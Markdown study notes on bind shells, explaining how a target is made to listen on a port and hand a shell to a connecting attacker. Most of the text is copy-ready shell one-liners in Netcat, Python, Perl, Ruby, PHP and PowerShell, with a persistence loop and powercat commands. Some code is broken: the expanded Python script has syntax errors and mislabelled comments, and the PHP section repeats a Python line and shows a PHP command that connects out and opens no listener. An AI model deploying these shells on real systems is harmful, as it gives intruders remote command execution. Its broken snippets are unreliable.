---
created: 22-01-2026
tags:
  - shells
  - net_hack
---
## Bind shell

>A **bind shells** is a type of remote shell where the **target machine** binds a command shell (e.g., `/bin/bash` or `cmd.exe`) to a specific listening port. The attacker then connects to this port from their machine to gain a command-line interface.

>[!note] This is in contrast to a reverse shell, where the target machine connects back to a listener on the attacker's machine.

The primary use case for a bind shell is to circumvent **egress filtering**.
- Many enterprise networks prevent internal severs from initiating any outbound connections, therefore there's no way to use a reverse shell to establish a connection back to the attacker's machine. 
- But inbound rules may be less restrictive, especially if the target server is already exposed to the internet (e.g., a web server). In this scenario, forcing the target to listen might be the only viable option to get a shell.

>[!note] Due to egress firewall rules commonly encountered in corporate networks, reverse shells may often be more practical. See [[reverse_shells]].
## Bind shell with Netcat

- Bind shell with Netcat:

```bash
nc -lvp 1337 -e /bin/bash
```

>[!interesting]+ How this bind shell works
>- `-l` tells Netcat to operate in listener mode (wait for incoming connections instead initiating one).
>- `-p 1337` specifies the port number (`1337`) to listen on. Netcat will **bind** to that port.
>- The `-e` option specifies a command to execute after a connection is established, and `-e /bin/bash` turns the connection to a shell. This is why this option is often disabled on modern systems.

>[!note] The shell runs with the privileges of the user who started Netcat.

- You can connect to the shell from your attacking machine with:

```bash
nc -nv <target_ip_address> 1337
```

>[!note] The `-v` flag again provides verbose output and shows the connection status. 

>[!warning] For a bind shell to work, the target must be reachable on the specified server (e.g., the TCP port `1337` must not be blocked).

## Netcat and pipes

- If the `-e` flag is not available, you can construct a bind shell using named pipes (FIFOs):

```bash
mkfifo /tmp/pipefile; \
nc -lvnp 1337 < /tmp/pipefile | /bin/sh > /tmp/pipefile 2>&1; \
rm /tmp/pipefile
```

>[!interesting]+ How this bind shell works
> - `mkfifo /tmp/pipefile`
> 	- Creates [named pipe](https://www.linuxjournal.com/article/2156) (FIFO) at `/tmp/pipefile`, a special file that acts as a bidirectional communication channel between two processes. 
> 	- Anything written to the pipe by one process can be read by another, and vice versa.
> ---
> - `nc -lvnp 1337 < /tmp/pipefile` 
> 	- Starts a Netcat listener (`-l`) on port `1337` (`-p 1337`), in verbose mode (`-v`) and DNS resolution disabled (`-n`). 
> 	- The `< /tmp/pipefile` part tells Netcat to read its standard input from the named pipe instead of standard input (`stdin`). This means any data written to `/tmp/pipefile` will be sent out over the network to whoever is connected (i.e., the attacker).
> ---
> - `| /bin/sh` 
> 	- The pipe operator `|` channels Netcat output, i.e., all data received from the network connection, into `/bin/sh`, which executes it as shell commands.
> 	- So, when the attacker types commands and sends them through their connection, Netcat receives them and passes to `/bin/sh` for execution.
> ---
> - `> /tmp/pipefile 2>&1` 
> 	- This redirection captures both standard output (`>`) and standard error (`2>&1`) from the shell and writes them back into the named pipe. 
> 	- The circle has closed: commands from the attack flow into the shell, the the shell's output flows back through the named pipe to Netcat, which transmits it back to the attacker.
> ---
> - `rm /tmp/pipefile` 
> 	- Finally, `rm` removes the named pipe after the connection closes.

>[!note] Unlike regular pipes created with the `|` operator (which only exist in memory during a process execution), named pipes persist as special files in the filesystem and can be accessed by multiple processes.

## Netcat bind shell with persistence

- For scenarios where you want the bind shell to restart if the connection is interrupted:

```bash
while true; do nc -lvnp 1337 -e /bin/bash; sleep 2; done
```

After each connection closes, the script waits 2 seconds (to avoid rapid restarts) and then launches Netcat again. This is useful where connections might drop unexpectedly due to network issues.
## Python bind shell

- Python IPv4 bind shell one-liner:

```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",1337));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn("/bin/bash");s.close()'
```

Here's an expanded version:

```Python
import socket # network communication
import os     # OS interactions
import pty    # for a pseudo-terminal

# create a new socket object using IPv4 address (AF_INET) and TCP (SOCK_STREAM)
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# bind the socket to all interfaces (0.0.0.0) and the chosen port (1337)
s.bind(("0.0.0.0", 1337))

# start listening for incoming connections, with a backlog queue size of 1
s.listen(1)

# accept the first incoming connection
# c is the client socket object, a is the client address
c, a = s.accept()

# redirect stdin (fd 0) to the socket's file descriptor (client connection)
os.dup2(c.fileno(),0)

# redirect stdin (fd 1) to the socket's file descriptor
os.dup2(c.fileno(),1

# redirect stdin (fd 2) to the socket's file descriptor
;os.dup2(c.fileno(),2)

# spawn an interactive bash shell
pty.spawn("/bin/bash")

# close the listening socket (since the connection is already established)
s.close()
```

To understand this code better, let's take a closer look at how bind shells work under the hood:

1. **`socket()`: Socket creation**
	- The OS creates a **socket**, specifying the communication domain (e.g., `AF_INET` for IPv4), the type of communication (e.g., `SOCK_STREAM` for TCP), and the protocol (e.g., `IPPROTO_TCP`).
	- The OS returns a file descriptor (Linux/Unix) that represents this socket.
---
2. **`bind()`: Binding**
	- The newly created socket is an abstract entity. To make it usable, you need to **bind it** to a specific network interface and port.
	- If the port is already in use, the `bind` operation will fail.
---
3. **`listen()`: The listening queue**
	- Once the socket is bound to a port, the OS starts listening on that socket using `listen()`. 
	- The OS also creates a **backlog queue** for this socket. When a connection request arrives from the network before the application has had a chance to `accept()` it, the OS places the request into this queue. The size of this queue is a parameter to the `listen()` call.

>[!interesting] The **backlog queue** size refers to the maximum number of pending connections that can be queued for a listening socket before the system starts rejecting new incoming connections.

---
4. **`accept()`: Acceptance of a connection**
	- The `accept()` call first pauses the application and tells it to wait until an incoming connection request arrives in the backlog queue.
	- When a connection arrives, the OS does **not** use the original listening socket for the data transfer. Instead, it creates a **new socket** with its own unique file descriptor.
	- This new socket represents the specific connection to the remote client (the attacker).
---
5. **`fork()`: spawning a new process**
	- The listening application typically creates a child process to handle the new connection (`fork()` on Linux/Unix).
	- This allows the parent process to immediately go back to the `accept()` call, ready for the next connection, while the child process handles current session. 
---
6. **`exec()`: Image replacement**
	- The child process then replaces its own executable image with that of a shell (e.g., `/bin/bash`, `cmd.exe`, or `powershell.exe`) using `exec()` (on Unix).
---
7. **`dup2()`: I/O redirection**
	- This is the step that turns a simple network connection into an interactive shell.
	- Once the connection is accepted and the new socket is created, the shell is spawned and its I/O is redirected over the network.
	- Before the shell is executed (or immediately after, depending on the implementation), the child process's (the shell) standard file descriptors are **duplicated** (with `dup2()`) and pointed to the connected socket's (network connection) file descriptor.

		- **`stdin`, file descriptor `0` → redirected to read from the socket.**
		- **`stdout`, file descriptor `1` → redirected to write to the socket.**
		- **`stderr`, file descriptor `2` → redirected to write to the socket.**

	- Now, any command the attacker types into their client is sent over the network and becomes the `stdin` for the shell process on the target.
	- Any output or errors generated by that command are written to the shell's `stdout` and `stderr`, which are piped back across the network to the attacker's terminal.

Here are a few other Python bind shells:

- IPv4, `subprocess` instead of `pty`:

```bash
python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",1337));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

- IPv4, `subprocess` + pipes:

```bash
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1337));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

- IPv6:

```bash
python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.bind(("::1",1337,0,2));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```
## Perl bind shell

```bash
perl -MIO::Socket -e '$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,2);while(accept(C,S)){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
```
## Ruby bind shell

```bash
ruby -rsocket -e 'f=TCPServer.new("1337");c=f.accept;IO.dup2(c.fileno,0);IO.dup2(c.fileno,1);IO.dup2(c.fileno,2);exec "/bin/bash -i"'
```

```bash
ruby -rsocket -e 'f=TCPServer.new(51337);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
```
## PHP bind shell

```bash
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1337));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
``````bash
php -r '$sock=fsockopen("0.0.0.0",1337);exec("/bin/bash -i <&3 >&3 2>&3");'
```

## PowerShell bind shell

- A one-liner for a non-interactive shell:

```PowerShell
powershell -NoP -NonI -W Hidden -c "$listener = New-Object System.Net.Sockets.TcpListener('[IP_ADDRESS]',1337);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

- With [`powercat`](https://github.com/besimorhino/powercat):

```bash
# listen on target:
. .\powercat.ps1
powercat -l -p 1337 -ep

# connect from attacker:
. .\powercat.ps1
powercat -c 127.0.0.1 -p 1337
```
## References and further reading

- [`Python reverse shell and bind shell Cheat Sheet — shelld3v`](https://github.com/shelld3v/Python-shell-cheat-sheet)
- [`Bind Shell — Internals All The Things`](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/#powershell)

